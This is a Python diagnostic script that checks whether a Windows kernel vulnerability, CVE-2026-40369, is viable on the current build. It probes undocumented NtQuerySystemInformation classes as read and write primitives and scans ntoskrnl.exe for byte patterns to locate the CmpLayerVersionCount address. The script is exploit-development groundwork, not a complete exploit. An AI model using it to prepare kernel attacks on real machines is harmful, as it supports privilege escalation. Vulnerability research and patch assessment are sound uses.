"""Diagnostic: check if CVE-2026-40369 is viable on this Windows build.
Tests NtQuerySystemInformation class 253 and searches for CmpLayerVersionCount."""
import ctypes, struct, os, sys

ntdll = ctypes.WinDLL('ntdll')
ntdll.NtQuerySystemInformation.restype = ctypes.c_long
ntdll.NtQuerySystemInformation.argtypes = [
    ctypes.c_ulong, ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)
]

print(f"[*] Windows Build: {sys.getwindowsversion().build}")
print()

# Test 1: Does class 253 exist?
print("[*] Test 1: NtQuerySystemInformation class 253 (SystemLayerSnapshot)")
buf = ctypes.create_string_buffer(0x1000)
retlen = ctypes.c_ulong(0)
status = ntdll.NtQuerySystemInformation(253, buf, 0x1000, ctypes.byref(retlen))
print(f"    NTSTATUS = 0x{status & 0xFFFFFFFF:08X}")
if (status & 0xFFFFFFFF) == 0xC0000003:
    print("    >> STATUS_INVALID_INFO_CLASS — class 253 does NOT exist on this build!")
    print("    >> CVE-2026-40369 CANNOT work here (no write primitive)")
elif (status & 0xFFFFFFFF) == 0xC0000004:
    print("    >> STATUS_INFO_LENGTH_MISMATCH — class 253 EXISTS (needs bigger buffer)")
    print("    >> CVE-2026-40369 write primitive is available")
elif status == 0:
    print(f"    >> STATUS_SUCCESS, returned {retlen.value} bytes — class 253 EXISTS")
else:
    print(f"    >> Unexpected status, class may or may not exist")

# Test 2: Does class 222 exist?
print()
print("[*] Test 2: NtQuerySystemInformationEx class 222 (read primitive)")
ntdll.NtQuerySystemInformationEx.restype = ctypes.c_long
ntdll.NtQuerySystemInformationEx.argtypes = [
    ctypes.c_ulong, ctypes.c_void_p, ctypes.c_ulong,
    ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)
]
inbuf = ctypes.create_string_buffer(8)
status2 = ntdll.NtQuerySystemInformationEx(222, inbuf, 8, buf, 0x1000, ctypes.byref(retlen))
print(f"    NTSTATUS = 0x{status2 & 0xFFFFFFFF:08X}")
if (status2 & 0xFFFFFFFF) == 0xC0000003:
    print("    >> STATUS_INVALID_INFO_CLASS — class 222 does NOT exist")
    print("    >> CVE-2026-40369 read primitive unavailable")
elif (status2 & 0xFFFFFFFF) in (0xC0000004, 0xC000000D, 0):
    print("    >> Class 222 EXISTS")
else:
    print(f"    >> Status unclear")

# Test 3: Binary pattern scan for CmpLayerVersionCount
print()
print("[*] Test 3: Binary pattern scan in ntoskrnl.exe")
ntos_path = os.path.join(os.environ.get("SystemRoot", r"C:\Windows"), "System32", "ntoskrnl.exe")
with open(ntos_path, 'rb') as f:
    data = f.read()

pe_off = struct.unpack_from('<I', data, 0x3C)[0]
num_secs = struct.unpack_from('<H', data, pe_off + 6)[0]
opt_size = struct.unpack_from('<H', data, pe_off + 20)[0]
sec_start = pe_off + 24 + opt_size

sections = []
for i in range(num_secs):
    o = sec_start + i * 40
    sn = data[o:o+8].rstrip(b'\x00').decode('ascii', errors='replace')
    sr = struct.unpack_from('<I', data, o + 12)[0]
    sraw = struct.unpack_from('<I', data, o + 20)[0]
    sv = struct.unpack_from('<I', data, o + 8)[0]
    chars = struct.unpack_from('<I', data, o + 36)[0]
    sections.append((sn, sr, sraw, sv, chars))
    print(f"    Section {sn:8s}: RVA={sr:#010x} VSize={sv:#010x} Chars={chars:#010x}")

# Pattern A: Win11 pattern (MOV [rsp+28h], 0xFF8 + LEA)
pattern_a = bytes([0xc7, 0x44, 0x24, 0x28, 0xf8, 0x0f, 0x00, 0x00])
print(f"\n    Pattern A (Win11): MOV [rsp+28h], 0xFF8 + LEA rdx, [rip+X]")
found_a = False
for sn, sr, sraw, sv, chars in sections:
    if not (chars & 0x20000000):
        continue
    fb = data[sraw:sraw + min(sv, len(data) - sraw)]
    pos = 0
    while True:
        idx = fb.find(pattern_a, pos)
        if idx == -1:
            break
        pos = idx + 1
        lea_pos = idx + 8
        if lea_pos + 7 <= len(fb) and fb[lea_pos] == 0x48 and fb[lea_pos+1] == 0x8D:
            modrm = fb[lea_pos + 2]
            if (modrm & 0xC7) == 0x05:
                disp = struct.unpack_from('<i', fb, lea_pos + 3)[0]
                target_rva = sr + lea_pos + 7 + disp
                rva = sr + idx
                print(f"    FOUND at RVA {rva:#010x} -> target RVA {target_rva:#010x}")
                found_a = True
if not found_a:
    print(f"    NOT FOUND")

# Pattern B: search for 0xFF8 with any stack offset + LEA
print(f"\n    Pattern B: MOV [rsp+XX], 0xFF8 (any offset) near LEA")
# c7 44 24 XX f8 0f 00 00  (MOV DWORD [rsp+XX], 0xFF8)
# c7 84 24 XX XX XX XX f8 0f 00 00  (MOV DWORD [rsp+XXXXXXXX], 0xFF8)
pattern_b1 = b'\xf8\x0f\x00\x00'  # the immediate 0xFF8
found_b = 0
for sn, sr, sraw, sv, chars in sections:
    if not (chars & 0x20000000):
        continue
    fb = data[sraw:sraw + min(sv, len(data) - sraw)]
    pos = 0
    while True:
        idx = fb.find(pattern_b1, pos)
        if idx == -1:
            break
        pos = idx + 1
        # Check if this is a MOV to stack (c7 44 24 XX or c7 84 24 XX XX XX XX)
        is_mov = False
        if idx >= 4 and fb[idx-4] == 0xc7 and fb[idx-3] == 0x44 and fb[idx-2] == 0x24:
            is_mov = True
            mov_rva = sr + idx - 4
            mov_len = 8
        elif idx >= 7 and fb[idx-7] == 0xc7 and fb[idx-6] == 0x84 and fb[idx-5] == 0x24:
            is_mov = True
            mov_rva = sr + idx - 7
            mov_len = 11

        if is_mov:
            # Look for LEA in next 16 bytes
            for delta in range(mov_len, mov_len + 16):
                lp = idx - (mov_len - 4) + delta
                if lp + 7 <= len(fb) and fb[lp] == 0x48 and fb[lp+1] == 0x8D:
                    modrm = fb[lp + 2]
                    if (modrm & 0xC7) == 0x05:
                        disp = struct.unpack_from('<i', fb, lp + 3)[0]
                        target_rva = sr + lp + 7 + disp
                        print(f"    FOUND MOV [rsp+...], 0xFF8 at RVA {mov_rva:#010x} -> LEA target {target_rva:#010x}")
                        found_b += 1
                        if found_b >= 5:
                            break
            if found_b >= 5:
                break
    if found_b >= 5:
        break
if found_b == 0:
    print(f"    NOT FOUND — 0xFF8 pattern doesn't exist in this kernel")

# Pattern C: search for string "CmpLayerVersionCount" in binary
print(f"\n    Pattern C: String search for 'CmpLayerVersionCount'")
str_pat = b'CmpLayerVersionCount'
idx = data.find(str_pat)
if idx != -1:
    print(f"    FOUND string at file offset {idx:#x}")
else:
    print(f"    String NOT FOUND in binary")

# Pattern D: count Cmp*Layer* cross-refs
print(f"\n    Pattern D: Search for 'CmpLayer' related strings")
pos = 0
while True:
    idx = data.find(b'CmpLayer', pos)
    if idx == -1:
        break
    end = data.find(b'\x00', idx)
    s = data[idx:min(end, idx+60)].decode('ascii', errors='replace')
    print(f"    @ offset {idx:#010x}: {s}")
    pos = idx + 1

print()
print("=" * 60)
if (status & 0xFFFFFFFF) == 0xC0000003:
    print("VERDICT: CVE-2026-40369 is NOT viable on this build.")
    print("  Class 253 (SystemLayerSnapshot) doesn't exist.")
    print("  You need Windows 11 for this exploit.")
else:
    print("VERDICT: Class 253 exists. CmpLayerVersionCount RVA")
    print("  needs to be found via alternative method.")
